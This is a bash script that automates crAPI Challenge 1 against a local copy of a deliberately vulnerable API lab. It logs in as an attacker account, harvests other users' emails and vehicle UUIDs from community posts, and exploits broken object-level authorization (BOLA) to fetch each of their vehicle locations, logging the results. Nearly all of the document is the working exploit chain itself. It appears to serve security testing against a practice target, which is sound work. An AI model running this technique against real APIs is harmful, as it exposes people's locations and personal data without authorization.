#!/bin/bash
# crAPI Challenge 1: BOLA on Vehicle Location
# Multi-step: Login → get own vehicle → enumerate other vehicles' UUIDs from
# community posts → access their location data
BASE="http://localhost:8888"
LOG="test_logs/crapi_chain1_bola_vehicle.log"
> "$LOG"

echo "=== crAPI Chain: BOLA Vehicle Location ===" | tee -a "$LOG"
echo "Started: $(date)" | tee -a "$LOG"
echo "" | tee -a "$LOG"

# Step 1: Login
echo "--- Step 1: Login as attacker ---" | tee -a "$LOG"
LOGIN_RESP=$(curl -s -X POST "$BASE/identity/api/auth/login" \
  -H "Content-Type: application/json" \
  -d '{"email":"attacker@test.com","password":"Passw0rd!"}')
TOKEN=$(echo "$LOGIN_RESP" | python3 -c "import sys,json; print(json.load(sys.stdin).get('token',''))" 2>/dev/null)
echo "Token: ${TOKEN:0:50}..." | tee -a "$LOG"
echo "" | tee -a "$LOG"

# Step 2: Get own dashboard to understand the data model
echo "--- Step 2: Get own dashboard ---" | tee -a "$LOG"
curl -s -H "Authorization: Bearer $TOKEN" "$BASE/identity/api/v2/user/dashboard" | python3 -m json.tool | tee -a "$LOG"
echo "" | tee -a "$LOG"

# Step 3: Enumerate vehicle UUIDs from community posts (data leak)
echo "--- Step 3: Harvest vehicle UUIDs from community forum ---" | tee -a "$LOG"
POSTS=$(curl -s -H "Authorization: Bearer $TOKEN" "$BASE/community/api/v2/community/posts/recent")
echo "$POSTS" | python3 -c "
import sys, json
data = json.load(sys.stdin)
for post in data.get('posts', []):
    author = post.get('author', {})
    print(f\"  User: {author.get('email')} -> Vehicle: {author.get('vehicleid')}\")
" | tee -a "$LOG"
echo "" | tee -a "$LOG"

# Extract vehicle UUIDs
VEHICLE_IDS=$(echo "$POSTS" | python3 -c "
import sys, json
data = json.load(sys.stdin)
for post in data.get('posts', []):
    vid = post.get('author', {}).get('vehicleid', '')
    if vid:
        print(vid)
")

# Step 4: BOLA - access each vehicle's location (not our vehicle!)
echo "--- Step 4: BOLA - access other users' vehicle locations ---" | tee -a "$LOG"
for VID in $VEHICLE_IDS; do
  echo "  GET /api/v2/vehicle/$VID/location" | tee -a "$LOG"
  curl -s -H "Authorization: Bearer $TOKEN" \
    "$BASE/identity/api/v2/vehicle/$VID/location" | python3 -m json.tool 2>/dev/null | tee -a "$LOG"
  echo "" | tee -a "$LOG"
done

echo "=== BOLA Vehicle Chain Complete ===" | tee -a "$LOG"
echo "Finished: $(date)" | tee -a "$LOG"
